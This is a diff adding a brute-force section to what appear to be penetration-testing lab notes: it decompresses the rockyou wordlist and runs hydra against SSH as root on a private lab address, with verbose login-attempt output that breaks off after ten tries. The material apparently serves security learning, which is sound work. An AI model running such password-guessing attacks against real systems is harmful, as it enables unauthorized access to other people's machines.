@@ -28,3 +28,26 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 14.90 seconds
 
 
+2. Access Attempt - Brute Force
+
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+#Decompresses file
+#Brute Force against 192.168.56.102
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102 -t 4 -V
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-08 20:06:04
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://192.168.56.102:22/
+[ATTEMPT] target 192.168.56.102 - login "root" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 192.168.56.102 - login "root" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 192.168.56.102 - login "root" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 192.168.56.102 - login "root" - pass "password" - 4 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 192.168.56.102 - login "root" - pass "iloveyou" - 5 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 192.168.56.102 - login "root" - pass "princess" - 6 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 192.168.56.102 - login "root" - pass "1234567" - 7 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 192.168.56.102 - login "root" - pass "rockyou" - 8 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 192.168.56.102 - login "root" - pass "12345678" - 9 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 192.168.56.102 - login "root" - pass "abc123" - 10 of 14344399 [child 3] (0/0)
+#... Attempts keep going 
+
+
+
